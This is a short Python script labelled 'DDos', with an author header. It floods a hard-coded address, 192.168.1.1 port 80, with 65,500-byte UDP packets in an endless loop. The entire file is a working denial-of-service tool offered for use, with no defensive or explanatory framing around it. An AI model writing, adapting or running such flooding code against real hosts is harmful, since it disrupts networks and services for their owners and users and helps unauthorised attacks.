"""
========================================
Name:DDos   Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/su-57g  
Written in 2023-5-3
==================NACG==================
"""
import socket
import os
os.system("clear")

target_addr = ('192.168.1.1', 80)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = 'A'*65500

while True:
    try:
        sock.sendto(data.encode(), target_addr)
    except:
        print('An error occurred')